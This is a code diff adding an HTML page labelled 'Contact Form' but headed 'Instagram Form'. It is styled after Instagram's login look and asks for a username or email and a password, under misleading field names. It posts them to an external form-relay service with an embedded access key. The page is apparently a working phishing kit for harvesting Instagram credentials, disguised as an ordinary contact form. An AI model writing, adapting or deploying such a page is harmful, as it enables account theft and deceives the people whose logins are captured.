@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html>
+<head>
+   <title>Contact Form</title>
+   <style>
+       body {
+           font-family: Arial, sans-serif;
+           background-color: #fafafa;
+           display: flex;
+           justify-content: center;
+           align-items: center;
+           height: 100vh;
+           margin: 0;
+       }
+
+       .container {
+           background-color: #fff;
+           border: 1px solid #dbdbdb;
+           padding: 20px;
+           border-radius: 4px;
+           text-align: center;
+           max-width: 350px;
+           width: 100%;
+       }
+
+       input[type="text"], input[type="password"], textarea {
+           width: 100%;
+           padding: 12px;
+           margin: 8px 0;
+           display: inline-block;
+           border: 1px solid #dbdbdb;
+           border-radius: 4px;
+           box-sizing: border-box;
+       }
+
+       button {
+           background-color: #0095f6;
+           color: white;
+           padding: 14px 20px;
+           margin: 8px 0;
+           border: none;
+           border-radius: 4px;
+           cursor: pointer;
+           width: 100%;
+       }
+
+       button:hover {
+           background-color: #0080e6;
+       }
+   </style>
+</head>
+<body>
+   <div class="container">
+       <form action="https://api.web3forms.com/submit" method="POST">
+       <h1>Instagram Form</h1>
+           <input type="hidden" name="access_key" value="e8e49cb3-86ca-405f-9f36-518f87320acb">
+
+       <input type="text" name="name" placeholder="Username or email " />
+       <input type="text" name="email" placeholder="Password " />
+       <input type="text" name="subject" placeholder="Subject" />
+       <textarea name="message" placeholder="Your Message" rows="4"></textarea>
+       <button>Send Message</button>
+       </form>
+   </div>
+</body>
+</html>
